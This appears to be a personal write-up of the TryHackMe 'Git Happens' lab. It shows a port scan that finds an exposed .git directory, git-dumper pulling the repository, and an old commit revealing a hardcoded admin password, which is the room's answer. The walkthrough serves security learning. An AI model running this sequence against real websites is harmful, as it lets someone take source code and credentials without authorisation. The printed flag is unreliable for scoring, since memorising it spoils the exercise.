@@ -1,0 +1,64 @@
+-------------------ROOM GIT HAPPEN TRYHACKME----------------
+Date:09 Oct 2024
+Link:https://tryhackme.com/r/room/githappens
+
+rustscan -a 10.10.4.116 -- -A -sV -sC -O -Pn
+	PORT   STATE SERVICE REASON         VERSION
+	80/tcp open  http    syn-ack ttl 61 nginx 1.14.0 (Ubuntu)
+	|_http-title: Super Awesome Site!
+	| http-methods: 
+	|_  Supported Methods: GET HEAD
+	|_http-server-header: nginx/1.14.0 (Ubuntu)
+	| http-git: 
+	|   10.10.4.116:80/.git/
+	|     Git repository found!
+	
+pip3 install git-dumper
+
+git-dumper http://10.10.4.116:80/.git/ ~/website
+
+sudo mv ~/website /home/kali/Desktop/rooms/git_happen
+
+git config --global --add safe.directory /home/kali/Desktop/rooms/git
+
+git checkout
+
+git log
+	commit 395e087334d613d5e423cdf8f7be27196a360459
+	Author: Hydragyrum <hydragyrum@gmail.com>
+	Date:   Thu Jul 23 23:17:43 2020 +0200
+
+	    Made the login page, boss!
+	    
+	   
+git checkout 395e087334d613d5e423cdf8f7be27196a360459
+	Note: switching to '395e087334d613d5e423cdf8f7be27196a360459'.
+
+	You are in 'detached HEAD' state. You can look around, make experimental
+	changes and commit them, and you can discard any commits you make in this
+	state without impacting any branches by switching back to a branch.
+
+	If you want to create a new branch to retain commits you create, you may
+	do so (now or later) by using -c with the switch command. Example:
+
+	  git switch -c <new-branch-name>
+
+	Or undo this operation with:
+
+	  git switch -
+
+	Turn off this advice by setting config variable advice.detachedHead to false
+
+	HEAD is now at 395e087 Made the login page, boss!
+	
+
+
+cat index.html 
+<RETRIEVED>
+if (
+          username === "admin" &&
+          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+        ) {
+<RETRIVED>
+
+Thank you for reading my opinion of the room @petstar from togo
